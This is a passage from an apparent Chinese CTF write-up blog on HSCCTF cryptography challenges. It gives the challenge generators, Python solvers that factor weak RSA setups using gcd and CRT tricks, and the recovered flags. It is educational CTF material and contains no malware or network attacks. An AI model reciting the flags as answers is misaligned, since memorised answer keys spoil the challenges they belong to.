href="https://blog.csdn.net/weixin_44017838/article/details/105459003">V&amp;N2020 - Fast</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c1,c2 = [<span class="number">15258813801182767957948809411445530114743580005667897427534365589851124401953952700888032330082278736578651674105204553630115929829327520950316902504433079359916257355896937562916556083469602985115254272625361902512966905366505705193603115063442567259505806926885597909346860116511116593562896739734663097631870026814495999405532329662713707140991693625596972404484374296588505369466138353714461787853643947646268147993568111775200297788443085689323703846485412670213780175163562460311256388185948613714551169278328397181176821021494625532973065606678522088011055084956579073665474553688838705105692370860815836968744</span>, <span class="number">6812252973072040071827764212287068485224506664962923279994614164374840095630460681859406585838865259535150445414577263383839286602668872146630568583093203237350230531896113453730563536559780725054737930704052263836882704963528437893607940373145674848731274193348770450738356162141551719346994698149112827383011042635625991946491545698464513315705253441372356270248537025391519052228332747340090073726648071921053097612521949040588826684887577900030607964457543549015338544684381220552952995724701579427363382069065679545196826947900332605250858694574423497096207350532949517663416877954484913664168104807510052994343</span>]</span><br><span class="line">n, g1, g2= [<span class="number">20807018344486474639307429177279931766730766338068107239915507489300098048895435781756514265069820029246382818970733268271541419058569567895618666922180270584064313671561310704041755422624879418184008100473568396190523033929320245716340019444764233261191278982354931492880877566550189410854395486995604287009460090861952156686772486228583819235930673806632618770875593810617784176409247510465542253043645164164225524491704753384493817563203956665022724674535516870726747405974392352500432805602085261375142216501656342533659731098891481615791354504343987459436489040377662127479793769523359343534307819013289699807101</span>, <span class="number">13669954919111873554762685722926885077118528999414402163291237939605095249827361266585404348819936899557500751307328088850133462100189908649705354225171362748567332828733792410877365393472368767642223613483944864421225366984013053159643284842823692865975521013400160643858123645513020647367033022539177063702511618272018019345686324322865461583030805528508961559861228807898458344763909703624723082316946660539208262816734999777236686904487167545596412866146192769859422435979617441355968077981338491466670291310491623996943880557071723073298267310617017933994938481600905833829730599911183096116409487608858717083764</span>, <span class="number">16004755272896973088305242134835363565950101667041191767091338528075710730690484241256646402124331734165332717221873300040844257120250717798419429003342474882969292183331631773486056363790119500409511338474885148624744719334829519138941747721940978742668429331169327121848561577357339194970483392418062307133642660625962426570987080348107999849220769541832138719358407833846252908305766546561532003650472770370573552424932908544299331489147220956574184822433945571318688467182365231955276573176433559755313822566687880866791301904461559170416753669109833335824210853322226762705537051009387847122221014380228383127427</span>]</span><br><span class="line"></span><br><span class="line">p = gcd(g1-<span class="number">1</span>,n)</span><br><span class="line">q = gcd(g2-<span class="number">1</span>,n)</span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br><span class="line"></span><br><span class="line">m = crt([c1%p,c2%q],[p,q])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;Any_restr1ct1ons_all_begins_with_his_own_heart&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="MIXED"><a href="#MIXED" class="headerlink" title="MIXED"></a>MIXED</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">q1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">p1 = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">n1 = q * p1</span><br><span class="line">n2 = p * q1</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">h0 = <span class="built_in">pow</span>(<span class="number">2023</span> * p + <span class="number">2024</span>, q1, n2)</span><br><span class="line">h1 = <span class="built_in">pow</span>(<span class="number">2024</span> * p1 + <span class="number">2023</span> * q, <span class="number">114</span>, n1)</span><br><span class="line">h2 = <span class="built_in">pow</span>(<span class="number">2023</span> * p1 + <span class="number">2024</span> * q, <span class="number">514</span>, n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n1 = <span class="subst">&#123;n1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n2 = <span class="subst">&#123;n2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h0 = <span class="subst">&#123;h0&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h1 = <span class="subst">&#123;h1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h2 = <span class="subst">&#123;h2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 = 14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863</span></span><br><span class="line"><span class="comment"># n2 = 17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737</span></span><br><span class="line"><span class="comment"># c = 13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656</span></span><br><span class="line"><span class="comment"># h0 = 5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481</span></span><br><span class="line"><span class="comment"># h1 = 12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688</span></span><br><span class="line"><span class="comment"># h2 = 10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851</span></span><br></pre></td></tr></table></figure></blockquote><p>参考 <a href="https://blog.csdn.net/Luiino/article/details/128509343">东华杯 - fermat’s revenge</a> 和 <a href="https://blog.csdn.net/qq_52193383/article/details/120317438">GKCTF 2021 - RRRRsa</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">14689930167621480307737218855980844793204825453111553640005733004311399091452749419195261723160562669712981077205514482387428543859060408330555457873612388970840075555219318724209919379670375754436986322725018229701175825510253987615017542205904982728558285520666278391637251512741084978804344612886660251741043298476839942441197788722691248949008018299101517153067904692310160459839327965213126456776042470327923603098133019640956702820908299859534676381094974148722668171932091455546601087513513432342088579253210930555185169910878657816252698605590059713584044287411998445279104965229112287195772355914014694372863</span></span><br><span class="line">n2 = <span class="number">17914624231045471060767877283214815212078805279600237578901916178851704643026979522270658635212967285131654546207286875722198040564094351690066028556053274118826426726436922152056884333790850220488793722836758989770231697392015361745717234225528175411653330848965062023338707342188196332661335758350340958332400847642883219650661408895191363079017750144776587598058350920393498114498603046807597288603882782473322630631915467470131090200369527436760313289344813744004003957932606166823948354564464154141854938585629799995141656546295799610158824771809513458197812936595649326475123400845178122171317543843802357238737</span></span><br><span class="line">c = <span class="number">13183645788828584902734975771833842634134772971197066374278716198331982362845597338541987579827576129126962300555023319276896080171662261983323670516457816608069076576704379871559881585100353737989915143190277856145677733747073530969459479608854483866886381406790221076900624083605418670450439523062190633487764982399334967431524831264337949814367905185282600511829794170139623625545288981992093108619556180352620171550284923452864402624195790781899415138548827684042790774382313520961335293225295922563245148598807498320652973409239921962292395269739151692443069186695137458774227330748775469621908962878548784542656</span></span><br><span class="line">h0 = <span class="number">5690435858632801053001568276569200811072324786394351282330736437777643891675713760267573500875018036769819201228707494676033534733516436880434000381152290529934127584047681184797730806321117079578438213106595566102910231831641994870770844810797745935336962801658360541755214075101149142486964461669833043007174173934693214526552375910644574723526164021660497474760514459351270699055076380763188021265735007339272243426286470006040246926184305520860068095134003662496837644875879106318233600478000160450338727054920011063536387532763661934972965357326471012678550188382945584128136131833085006239075931753900705852481</span></span><br><span class="line">h1 = <span class="number">12771704142231361356944931328203992824809472923288035056741145310446323135378739806430357600688780862532180394967607429708811767590541126019805423171023560973250443508427614362854583240402451944730512334908779225174763498122005198084487562912524477476241978066554026569609494641830034817298185887790987627444544391680388213205514284116732325350187204519755399841372144149840914651521842402817701298224803289451378581226204084757079457612984358925767378458994608562174048729806309230061089552045138514542758457243626150673888166620841134063713151240297774551489301504222933127458884374866611598279831562420720169790688</span></span><br><span class="line">h2 = <span class="number">10768269134499905916388929049595509895751098112372323618798542159569174051578701710549609054808995774168931375186213550074900373023970882450822655786787740452681278837907191091338575561570211280095894576674089666981683405385847773819238581725093823429776684561667462626941518248024517707992035438082636259838822562843169441572048956484831730615047363383911454662789736761572912893234212875097536978423758275178050708616505311352511923810654873380808201395656416903900326634569672173228265730515727327832588326581592485713225927319225942965110285477266200380452637746037672411388696006933080509164615786616058664496851</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">h1x = <span class="built_in">pow</span>(h1 * <span class="built_in">pow</span>(<span class="number">2023</span>,<span class="number">114</span>,n1),<span class="number">514</span>,n1)</span><br><span class="line">h2x = <span class="built_in">pow</span>(h2 * <span class="built_in">pow</span>(<span class="number">2024</span>,<span class="number">514</span>,n1),<span class="number">114</span>,n1)</span><br><span class="line">q = gcd(h2x-h1x,n1)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line">kp = h0-<span class="built_in">pow</span>(<span class="number">2024</span>,n2,n2)</span><br><span class="line">p = gcd(n2,kp)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;hscctf&#123;35d7ecc2-6216-4f09-b052-3de921f170b6&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="YOUQU"><a href="#YOUQU" class="headerlink" title="YOUQU"></a>YOUQU</h3><blockquote><p>出题人很有趣,给你函数了直接解吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> poly</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polymul(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polyadd(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, <span class="number">2</span>, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qz</span>(<span class="params">z, lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, z, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.random.normal(<span class="number">0</span>, <span class="number">2</span>, size=lenth1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jlkey</span>(<span class="params">lenth1, z, mod</span>):</span><br><span class="line">    s = q2(lenth1)</span><br><span class="line">    g = qz(z, lenth1)</span><br><span class="line">    e1 = guess(lenth1)</span><br><span class="line">    t = add(mul(g, s, z, mod), e1, z, mod)</span><br><span class="line">    key = [g, t, s]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jl</span>(<span class="params">key, length1, n, p, mod, msg</span>):</span><br><span class="line">    jlm = []</span><br><span class="line">    mm = <span class="built_in">hex</span>(msg)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mm)):</span><br><span class="line">        jlm.append(<span class="built_in">ord</span>(mm[i]))</span><br><span class="line"></span><br><span class="line">    m = np.array(jlm + [<span class="number">0</span>] * (length1 - <span class="built_in">len</span>(jlm)), dtype=np.int64) % p</span><br><span class="line">    d = n // p</span><br><span class="line">    dm = d * m % n</span><br><span class="line">    e2 = guess(length1)</span><br><span class="line">    e3 = guess(length1)</span><br><span class="line">    r = q2(length1)</span><br><span class="line">    g = key[<span class="number">0</span>]</span><br><span class="line">    t = key[<span class="number">1</span>]</span><br><span class="line">    w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod)</span><br><span class="line">    v = add(mul(g, r, n, mod), e3, n, mod)</span><br><span class="line">    c = [w, v]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">o = <span class="number">128</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">62</span></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (o - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line">key = jlkey(o, n, mod)</span><br><span class="line">flag = <span class="string">&#x27;HSCCTF&#123;fakeflag_xin_nian_kuai_le&#125;&#x27;</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line">c = jl(key, o, n, p, mod, m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;w =&quot;</span>, c[<span class="number">0</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;v =&quot;</span>, c[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;g =&quot;</span>, key[<span class="number">0</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;t =&quot;</span>, key[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;s =&quot;</span>, key[<span class="number">1</span>].tolist())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">w = [4456121292753321984, 2695388220323384832, 1125798304404134912, 1389165333028469760, 3720515311443086336, 1806160162087117824, 1710165564223285248, 3854525633894178816, 4160032803226148864, 3223993978734964736, 188029029972998144, 2283288149728718848, 178098730553155584, 400166020473782272, 4426677526375129088, 1768526165797007360, 4596103848246980608, 3143341953117548544, 4113813229295153152, 1444787342796136448, 1749143783191330816, 601663717837410304, 1976180375223943168, 899486064067571712, 2467702122158211072, 1442313048691163136, 2977506408218411008, 1106991111199326208, 844904722420957184, 1013497211561496576, 4250614525386129408, 1677797764964532224, 4212901529405988864, 2561734724771299328, 1890807629146202112, 951039123411230720, 881428262835757056, 514344970914586624, 3072465238399721472, 1294633561516974080, 4471068621313253376, 2978038764905480192, 1256294011046658048, 2885789906784919552, 1808546586690191360, 3846883621647482880, 422980376119787520, 3401510714240147456, 3024926897503240192, 3504641379026477056, 2686993749796929536, 4084804987293286400, 1949654215988994048, 2949577339713200128, 2514172581835300864, 614361226066452480, 1560522408220647424, 1215782736092413952, 1705607337158410240, 3789095360729792512, 126768310879952896, 3564560282876477440, 4112635401656336384, 488963213586022400, 3263989278014881792, 1190526290525741056, 3726804923972673536, 2773020963465314304, 2008550394681090048, 2877753734522249216, 3318721688589254656, 2685195110085615616, 2120287225013829632, 2837075008393977856, 680647261446750208, 2672034759831756800, 586790221783564288, 4413791420559310848, 753748175057453056, 4156435215025135616, 1753634903657668608, 3868573500772638720, 1065381465124585472, 1951729611177713664, 833463289401663488, 3083559584672243712, 2453364017450852352, 3187954181254758400, 2701962603281113088, 1657135743981748224, 3393942972234113024, 3224375546132267008, 1637663670848045056, 2226464092285288448, 3426678970486587392, 3746864906767974400, 892187878069846016, 1566105953383768064, 1841796609436766208, 102854404605427712, 1384852880673484800, 2187150610629812224, 3960839367218393088, 798293770690805760, 172119736121323520, 2434320282093170688, 3398926147058458624, 858963714965422080, 3371154991043334144, 1537312801335345152, 2963315646558453760, 4058550201296797696, 1544831164568528896, 4296983781331357696, 3597399236973740032, 1172234645379473408, 1811007296491237376, 1364782914640955392, 1942828798540959744, 1312644494190576640, 540671172853423104, 2521681537802540032, 3678999552996606976, 3522586936321518592, 3355286245326997504, 1724989423167225856, 2857616461138001920, 3550411157752463360]</span></span><br><span class="line"><span class="string">v = [3004075223514152960, 375766571298967040, 3918175633582001664, 298998053399571840, 4539733962165100544, 3415675319003214848, 557497174827461120, 1187181217327680512, 42761045408950272, 4539692406094923776, 3474777010512353280, 807990709249906688, 4401927180657766400, 628439373724332032, 3552565694197467136, 1229559664627433472, 2735485480783970304, 340251515454152704, 535029869298274304, 1089634905489248256, 1745435675342262272, 2211405319829864448, 3166387633265565696, 3356595592575791104, 811586262403354624, 1658544963444764672, 2801381922146680832, 1906405005677551616, 2764661089781948416, 348852661152833536, 2843732326950182912, 3655220640882900992, 2735228541582770176, 984245520265568256, 847631674608009216, 4278557074339209216, 354445030770749440, 552426514839019520, 3037890003690143744, 3845527152479436800, 686613871844605952, 1987014853275738112, 129221415412514816, 884028654840045568, 893161048767537152, 4428861422755028992, 1977654893495033856, 2683055322869915648, 4466344498597339136, 2820131774980661248, 2105607478169853952, 768444766180638720, 212987987936600064, 1576117523911901184, 1650389830627762176, 1915750840791851008, 4109009172913405952, 2218053892260061184, 3863963349465956352, 2990430210085863424, 1274030477779271680, 1711547929466978304, 1157679433574768640, 156097645996949504, 3695677787747401728, 4322888783310766080, 4546024412016992256, 2655974462028947456, 1604656974594400256, 2045021548923273216, 3161689730583207936, 8339332591755263, 2341948229963612160, 3607706207127453696, 469234496887414784, 973715854261501952, 789210633607102464, 4424949506055979008, 1542517731370860544, 182468406585786368, 1807090988320792576, 1850374377172516864, 2618527682038956032, 1262867559425187840, 938222240300924928, 4591256432328728576, 2044671823654682624, 3467964150293766144, 79543117595951104, 2185630104198291456, 3728244444110430208, 156056289984327680, 4390349499275018240, 1751182369256157184, 2162985531302232064, 2761554017168584704, 2829764058526203904, 2028689816016191488, 146286463995781120, 3720834471976288256, 2917463735459491840, 4566476477728677888, 3722002688823242752, 4245856959119122432, 3425954365963665408, 3618936531494342656, 3695636186696466432, 1423352273706041344, 158921080583421952, 4351926341975711744, 3376292832678187008, 3295795181429579776, 3267875754319810560, 2363850527793784832, 888488262224822272, 1097387081646508032, 3686827109357189120, 297511993689784320, 3698586652027076608, 1126524981060736000, 1227462499250052096, 195965752955788032, 378621325977167872, 4568860371418834944, 3806982850127191040, 2330191690590402560, 965690431040995328, 2254601344237207552]</span></span><br><span class="line"><span class="string">g = [1271385667288255999, 3597939031086288160, 948720385886874982, 3730034896312885091, 155961058571645646, 873298702409407364, 3695415802847080551, 3935805697420664465, 303427777773526115, 2121504102169723388, 3117842710535023914, 2004730725267082784, 315298886702225235, 711790101004272712, 3469726824196756845, 3649946521480214795, 4269586158067475466, 1607685984041888423, 1866766258134518609, 4115571819844332380, 2381299916655519619, 2208948036365614734, 1946214530009282102, 330799912617809735, 3460498231343524429, 2694359423578749492, 793704330311549271, 1491532600134534859, 1606672420502700650, 561106526228105342, 1105025457886824442, 1443932433209975334, 4240908184445005305, 1954646486670721382, 4227369777555389059, 1563814260527576306, 771217858163031033, 1280424786084049063, 303853418224126180, 181918673882271714, 2212581027220765469, 2111888312694611250, 3581354821166105988, 1429049683930421764, 1357441041735699015, 3553280165847887597, 869489768651033960, 1107714765447012644, 2910143081602408601, 1433461290183315706, 3240132019514117541, 2465292834002904411, 1334470694725903257, 3156578894981065904, 35185442949043438, 645993467993501426, 1352915688916657829, 1521946784078789166, 2639858512187877401, 4315064694485922395, 3953315792354490874, 1587769214913102261, 3912000075342935904, 1887499577531299413, 309657057763429254, 769590223035802807, 4361036733963754384, 1446528785602732156, 1205711736426995533, 3683188791797133788, 921287773622604679, 3591274357626650529, 2745859155549230842, 4491978210538609848, 2444128709624329128, 1403888264551474491, 4377727165055311964, 1507498290240201527, 2952796830041690744, 1642562262970195060, 2847743992975447391, 4164239208310834247, 1967003682977431435, 2575799088251274004, 156708464748056204, 2403917842083313594, 55721043545237639, 239916744182811448, 134638877854791156, 76687455444928683, 3051612621194354938, 4253947515818696559, 392166402534779315, 5415521347314633, 1816697745794261287, 2282876916808180261, 3667412627019328976, 4211876289328416715, 1647128252024708114, 3721877072126461741, 2297068963395433648, 398583411660274597, 3562855580894975650, 1322989240042277117, 3551729861626536144, 2816759739903316271, 2629395545611893101, 1799561289667084873, 2629410111371391637, 1398369600901640698, 447266788926484707, 405213767544537836, 3014220918160576578, 747208265285548041, 1727187447678753569, 3063564852472463780, 1502638600503176791, 3284205888928186113, 3412854446691461073, 3937011809364193960, 1208514509487198642, 3063044796627572289, 2532417142719581087, 375928502591586817, 2839325684818922862, 4472409225244809142, 1384186637673587546, 1680318030162086049]</span></span><br><span class="line"><span class="string">t = [3482937270284373504, 3729542463939501056, 1354530592839269376, 2340035975483411456, 3318144666530505728, 4321971466042776576, 4107840020098758656, 2600042509314867200, 3185315495632337920, 2510425761632839680, 3758844697217568768, 1813627045100445696, 1035634427310004224, 1650895865179787264, 931858574122051584, 3821738968282525696, 751354306590687232, 812159733109825536, 1984846083975063552, 426674528748978176, 1786129270688538624, 53204613942820864, 4207648582990901248, 2441413890227052544, 4573249524143439872, 2901255116891488256, 3331287389413953536, 1594453621617430528, 7636565623463936, 3261865719383670784, 3211543945355886592, 4414864510393499648, 1781787468450406400, 4381257290165919744, 1683943310183464960, 1618102318685454336, 3082727664554508288, 1284750602156802048, 4536273674447527936, 4224428964375134208, 1990811212107251712, 220641709431201792, 56727929599156224, 1394394833783595008, 474539825790402560, 2367070412709519360, 86013256530493440, 3983263247386468352, 4488230536002330624, 1131832099054157824, 4470326732790874112, 2361104703887433728, 1850267988673478656, 519014833878171648, 2447115942472581120, 2567048274520276992, 3409815404144214016, 2569012418791473152, 2239861171203006464, 3207035079062069248, 1423032481934245888, 3660676895628648448, 3197924030326439936, 2173721402472767488, 1836499846562930688, 1193190307175825408, 2757965850888388608, 3833547905923039232, 113362523505639424, 2095507640221974528, 695818728283136000, 2746136108677742592, 80271849461956608, 544596706215608320, 857894362373431296, 1801819582386577408, 2748888436946362368, 1760827740054806528, 2544591920627023872, 4324861829346312192, 3073160513540464640, 3260750497480876032, 1268136159796920320, 2738758060057362432, 460370852221685760, 3694812482865025024, 674485732026892288, 31827325234905088, 1076067066569760768, 3538749128687951872, 4553745898606747648, 3332219178735149056, 329835532944998400, 4576690061027602432, 3023286444576161792, 1797946474203955200, 4558389623053447168, 1790588264296259584, 3017170271014150144, 991463616551034880, 1940023178234544128, 3414390445152993280, 644333657859764224, 3692106158122917888, 3167684436092710912, 789204772426006528, 4353661356398166016, 2000540208800374784, 3942168043465134080, 3332450567729246208, 2627875622523490304, 9371534919516160, 848644069081235456, 2192689498702295040, 907016265148577792, 2645935549696630784, 2590866188404383744, 3750676748846913536, 3694849270404139008, 4268369840164233216, 3556945000413347840, 1995615102316576768, 4445424004994387968, 2929133498761163776, 2462149674675616768, 741748174115656704, 39754566828455680, 4477497218304360448]</span></span><br><span class="line"><span class="string">jjgqJn00BoV2m68QERWUCmah8h86UJERRsVhfzEzy9hBwi0GJ5MyEzBCQS5r0yr7GrdM5d0ptnBWLzfywakvSlRJvex1efrtHiDVNo4WQZjopk4N3RFi4D</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>先解最后的base，base62-base32-base58-base64-base62解得 <code>wo_shi_yhhhh_de_fen_si</code>。</p><p>用此作为密码解压得到一个 s.png，提取像素值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 